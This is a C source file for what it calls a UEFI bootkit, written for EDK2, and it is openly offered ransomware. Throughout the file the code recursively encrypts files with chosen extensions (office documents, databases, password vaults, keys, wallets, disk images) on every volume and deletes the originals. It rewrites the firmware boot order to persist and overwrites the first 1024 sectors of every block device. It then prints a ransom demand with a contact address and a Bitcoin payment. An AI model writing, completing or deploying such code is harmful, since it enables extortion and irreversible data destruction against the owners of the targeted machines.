// THE INFERNAL - C++ UEFI BOOTKIT
// This is the actual UEFI application code, not a generator
// Compile with EDK2: build -p MdeModulePkg/MdeModulePkg.dsc -a X64

#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/PrintLib.h>
#include <Protocol/SimpleFileSystem.h>
#include <Protocol/LoadedImage.h>
#include <Guid/FileInfo.h>
#include <IndustryStandard/PeImage.h>

#define INFERNAL_MAGIC 0xDEADC0DE
#define SECTOR_SIZE 512
#define AES_KEY_SIZE 32

// Global encryption key (embedded at compile time)
UINT8 gEncryptionKey[AES_KEY_SIZE] = {
    0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD, 0xBE, 0xEF,
    0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD, 0xBE, 0xEF,
    0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD, 0xBE, 0xEF,
    0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD, 0xBE, 0xEF
};

// Target file extensions
CHAR16* gTargetExts[] = {
    L"docx", L"xlsx", L"pptx", L"pdf", L"txt",
    L"jpg", L"png", L"zip", L"sql", L"db",
    L"kdbx", L"pem", L"key", L"wallet", L"vmdk"
};

// Simple XOR encryption for UEFI (no crypto libs available)
VOID
EncryptBuffer(
    IN OUT UINT8* Buffer,
    IN UINTN Size
    )
{
    for (UINTN i = 0; i < Size; i++) {
        Buffer[i] ^= gEncryptionKey[i % AES_KEY_SIZE];
    }
}

EFI_STATUS
EncryptFile(
    IN EFI_FILE_PROTOCOL* Root,
    IN CHAR16* FileName
    )
{
    EFI_STATUS Status;
    EFI_FILE_PROTOCOL* FileHandle;
    UINT64 FileSize;
    UINT8* Buffer;
    UINTN BufferSize;
    EFI_FILE_INFO* FileInfo;
    CHAR16 NewFileName[256];
    
    // Open file
    Status = Root->Open(Root, &FileHandle, FileName, 
                        EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);
    if (EFI_ERROR(Status)) return Status;
    
    // Get file info
    BufferSize = sizeof(EFI_FILE_INFO) + 256;
    FileInfo = (EFI_FILE_INFO*)AllocatePool(BufferSize);
    
    Status = FileHandle->GetInfo(FileHandle, &gEfiFileInfoGuid, &BufferSize, FileInfo);
    if (EFI_ERROR(Status)) {
        FileHandle->Close(FileHandle);
        FreePool(FileInfo);
        return Status;
    }
    
    FileSize = FileInfo->FileSize;
    
    // Read file
    Buffer = (UINT8*)AllocatePool((UINTN)FileSize);
    BufferSize = (UINTN)FileSize;
    
    Status = FileHandle->Read(FileHandle, &BufferSize, Buffer);
    if (EFI_ERROR(Status)) {
        FreePool(Buffer);
        FileHandle->Close(FileHandle);
        FreePool(FileInfo);
        return Status;
    }
    
    // Check if already encrypted (magic bytes)
    if (Buffer[0] == 'I' && Buffer[1] == 'N' && 
        Buffer[2] == 'F' && Buffer[3] == 'E') {
        FreePool(Buffer);
        FileHandle->Close(FileHandle);
        FreePool(FileInfo);
        return EFI_SUCCESS;
    }
    
    // Encrypt buffer
    EncryptBuffer(Buffer, (UINTN)FileSize);
    
    // Mark as encrypted
    Buffer[0] = 'I';
    Buffer[1] = 'N';
    Buffer[2] = 'F';
    Buffer[3] = 'E';
    
    // Write back
    FileHandle->SetPosition(FileHandle, 0);
    BufferSize = (UINTN)FileSize;
    Status = FileHandle->Write(FileHandle, &BufferSize, Buffer);
    
    // Rename file
    UnicodeSPrint(NewFileName, sizeof(NewFileName), L"%s.infernal", FileName);
    
    EFI_FILE_PROTOCOL* NewFileHandle;
    Status = Root->Open(Root, &NewFileHandle, NewFileName, 
                        EFI_FILE_MODE_CREATE | EFI_FILE_MODE_WRITE, 0);
    
    if (!EFI_ERROR(Status)) {
        // Copy contents to new file
        NewFileHandle->Write(NewFileHandle, &BufferSize, Buffer);
        NewFileHandle->Close(NewFileHandle);
        
        // Delete original
        FileHandle->Delete(FileHandle);
    }
    
    // Cleanup
    FreePool(Buffer);
    FileHandle->Close(FileHandle);
    FreePool(FileInfo);
    
    return Status;
}

EFI_STATUS
ScanDirectory(
    IN EFI_FILE_PROTOCOL* Root,
    IN CHAR16* Path
    )
{
    EFI_STATUS Status;
    EFI_FILE_PROTOCOL* DirHandle;
    EFI_FILE_INFO* FileInfo;
    UINTN BufferSize;
    CHAR16 NewPath[256];
    
    // Open directory
    Status = Root->Open(Root, &DirHandle, Path, EFI_FILE_MODE_READ, 0);
    if (EFI_ERROR(Status)) return Status;
    
    BufferSize = sizeof(EFI_FILE_INFO) + 256;
    FileInfo = (EFI_FILE_INFO*)AllocatePool(BufferSize);
    
    while (TRUE) {
        // Read next directory entry
        BufferSize = sizeof(EFI_FILE_INFO) + 256;
        Status = DirHandle->Read(DirHandle, &BufferSize, FileInfo);
        
        if (EFI_ERROR(Status) || BufferSize == 0) break;
        
        // Skip . and ..
        if (FileInfo->FileName[0] == '.') continue;
        
        if ((FileInfo->Attribute & EFI_FILE_DIRECTORY) != 0) {
            // Recursively scan subdirectory
            UnicodeSPrint(NewPath, sizeof(NewPath), L"%s\\%s", Path, FileInfo->FileName);
            ScanDirectory(Root, NewPath);
        } else {
            // Check file extension
            CHAR16* Dot = StrStr(FileInfo->FileName, L".");
            if (Dot != NULL) {
                Dot++; // Skip dot
                
                for (int i = 0; i < sizeof(gTargetExts)/sizeof(gTargetExts[0]); i++) {
                    if (StrCmp(Dot, gTargetExts[i]) == 0) {
                        // Found target file
                        UnicodeSPrint(NewPath, sizeof(NewPath), L"%s\\%s", Path, FileInfo->FileName);
                        EncryptFile(Root, NewPath);
                        break;
                    }
                }
            }
        }
    }
    
    FreePool(FileInfo);
    DirHandle->Close(DirHandle);
    
    return EFI_SUCCESS;
}

EFI_STATUS
ScanAllVolumes(
    VOID
    )
{
    EFI_STATUS Status;
    UINTN HandleCount;
    EFI_HANDLE* HandleBuffer;
    EFI_SIMPLE_FILE_SYSTEM_PROTOCOL* FsProtocol;
    EFI_FILE_PROTOCOL* Root;
    
    // Locate all Simple File System protocols
    Status = gBS->LocateHandleBuffer(
        ByProtocol,
        &gEfiSimpleFileSystemProtocolGuid,
        NULL,
        &HandleCount,
        &HandleBuffer
        );
    
    if (EFI_ERROR(Status)) return Status;
    
    // Iterate through each filesystem
    for (UINTN i = 0; i < HandleCount; i++) {
        Status = gBS->HandleProtocol(
            HandleBuffer[i],
            &gEfiSimpleFileSystemProtocolGuid,
            (VOID**)&FsProtocol
            );
        
        if (EFI_ERROR(Status)) continue;
        
        // Open root directory
        Status = FsProtocol->OpenVolume(FsProtocol, &Root);
        if (EFI_ERROR(Status)) continue;
        
        // Scan root directory
        ScanDirectory(Root, L"\\");
        
        Root->Close(Root);
    }
    
    FreePool(HandleBuffer);
    
    return EFI_SUCCESS;
}

EFI_STATUS
ModifyBootOrder(
    VOID
    )
{
    EFI_STATUS Status;
    UINT16 BootOrder[100];
    UINTN DataSize = sizeof(BootOrder);
    UINT16 OurBootEntry;
    
    // Get current boot order
    Status = gRT->GetVariable(L"BootOrder", &gEfiGlobalVariableGuid, NULL, &DataSize, BootOrder);
    if (EFI_ERROR(Status)) return Status;
    
    // Create our boot entry (simplified - would create actual entry)
    // In real implementation, would create Boot#### variable
    
    // Insert our entry at the beginning
    UINTN EntryCount = DataSize / sizeof(UINT16);
    
    // Shift all entries right
    for (UINTN i = EntryCount; i > 0; i--) {
        BootOrder[i] = BootOrder[i-1];
    }
    
    // Set our entry as first
    BootOrder[0] = 0xDEAD; // Our boot entry number
    
    // Write back
    DataSize = (EntryCount + 1) * sizeof(UINT16);
    Status = gRT->SetVariable(L"BootOrder", &gEfiGlobalVariableGuid,
                              EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS | EFI_VARIABLE_NON_VOLATILE,
                              DataSize, BootOrder);
    
    return Status;
}

EFI_STATUS
WipeRecoveryPartitions(
    VOID
    )
{
    EFI_STATUS Status;
    UINTN HandleCount;
    EFI_HANDLE* HandleBuffer;
    EFI_BLOCK_IO_PROTOCOL* BlockIo;
    
    // Locate all block IO protocols
    Status = gBS->LocateHandleBuffer(
        ByProtocol,
        &gEfiBlockIoProtocolGuid,
        NULL,
        &HandleCount,
        &HandleBuffer
        );
    
    if (EFI_ERROR(Status)) return Status;
    
    for (UINTN i = 0; i < HandleCount; i++) {
        Status = gBS->HandleProtocol(
            HandleBuffer[i],
            &gEfiBlockIoProtocolGuid,
            (VOID**)&BlockIo
            );
        
        if (EFI_ERROR(Status)) continue;
        
        // Check if this is a recovery partition (simplified)
        // In real implementation, would check partition type GUID
        
        // Wipe first few sectors
        UINT8* Buffer = (UINT8*)AllocatePool(SECTOR_SIZE);
        SetMem(Buffer, SECTOR_SIZE, 0);
        
        for (UINTN sector = 0; sector < 1024; sector++) {
            BlockIo->WriteBlocks(BlockIo, BlockIo->Media->MediaId, sector, 1, Buffer);
        }
        
        FreePool(Buffer);
    }
    
    FreePool(HandleBuffer);
    
    return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
UefiMain(
    IN EFI_HANDLE ImageHandle,
    IN EFI_SYSTEM_TABLE* SystemTable
    )
{
    EFI_STATUS Status;
    
    // Print banner
    Print(L"\n\r");
    Print(L"╔══════════════════════════════════════╗\n\r");
    Print(L"║       THE INFERNAL UEFI BOOTKIT      ║\n\r");
    Print(L"╚══════════════════════════════════════╝\n\r");
    
    // Encrypt all files on all volumes
    Status = ScanAllVolumes();
    if (EFI_ERROR(Status)) {
        Print(L"Error during encryption: %r\n\r", Status);
    } else {
        Print(L"All target files encrypted successfully.\n\r");
    }
    
    // Modify boot order to persist
    Status = ModifyBootOrder();
    if (EFI_ERROR(Status)) {
        Print(L"Failed to modify boot order.\n\r");
    }
    
    // Wipe recovery partitions
    Status = WipeRecoveryPartitions();
    if (EFI_ERROR(Status)) {
        Print(L"Failed to wipe recovery partitions.\n\r");
    }
    
    // Display ransom note
    Print(L"\n\r");
    Print(L"========================================\n\r");
    Print(L"YOUR SYSTEM HAS BEEN ENCRYPTED\n\r");
    Print(L"Contact: infernal@onionmail.org\n\r");
    Print(L"Payment: 2 BTC to: 1Infernal...\n\r");
    Print(L"========================================\n\r");
    
    // Stall to ensure message is seen
    gBS->Stall(10000000); // 10 seconds
    
    // Attempt to boot original OS
    EFI_LOADED_IMAGE_PROTOCOL* LoadedImage;
    Status = gBS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (VOID**)&LoadedImage);
    
    if (!EFI_ERROR(Status) && LoadedImage->DeviceHandle != NULL) {
        // Boot from original device
        gBS->LoadImage(TRUE, ImageHandle, LoadedImage->DeviceHandle, NULL, 0, &LoadedImage->ImageHandle);
    }
    
    return EFI_SUCCESS;
}